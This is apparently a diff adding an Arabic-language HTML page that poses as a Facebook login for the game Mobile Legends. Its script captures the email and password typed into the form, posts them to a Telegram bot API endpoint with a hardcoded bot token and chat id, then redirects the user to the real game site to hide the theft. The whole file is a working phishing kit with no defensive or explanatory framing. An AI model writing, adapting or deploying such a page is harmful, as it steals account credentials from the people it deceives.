@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول لفيسبوك - موبايل ليجند</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .login-container {
+            margin-top: 50px;
+            background-color: white;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            display: inline-block;
+        }
+        img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            padding: 10px;
+            margin: 10px 0;
+            width: 80%;
+            max-width: 300px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-btn {
+            padding: 10px 20px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            width: 80%;
+            max-width: 300px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .login-btn:hover {
+            background-color: #155bba;
+        }
+        .footer {
+            margin-top: 20px;
+            color: #606770;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+    </style>
+    <script>
+        function sendTelegram(event) {
+            event.preventDefault();  // منع إرسال النموذج افتراضيًا
+
+            // الحصول على بيانات تسجيل الدخول
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var message = "تسجيل دخول جديد \n" + "Email: " + email + "\nPassword: " + password;
+
+            // إرسال البيانات إلى بوت تليجرام
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("chat_id=1900509620&text=" + encodeURIComponent(message));
+
+            // بعد إرسال البيانات، تحويل المستخدم إلى الصفحة الأصلية
+            xhr.onload = function() {
+                window.location.href = "https://m.mobilelegends.com/";
+            };
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <form onsubmit="sendTelegram(event);">
+            <input type="text" id="email" placeholder="البريد الإلكتروني" required><br>
+            <input type="password" id="password" placeholder="كلمة المرور" required><br>
+            <button class="login-btn" type="submit">تسجيل الدخول</button>
+        </form>
+        <div class="footer">
+            <p>ليس لديك حساب؟ <a href="#">سجل الآن</a></p>
+        </div>
+    </div>
+</body>
+</html>
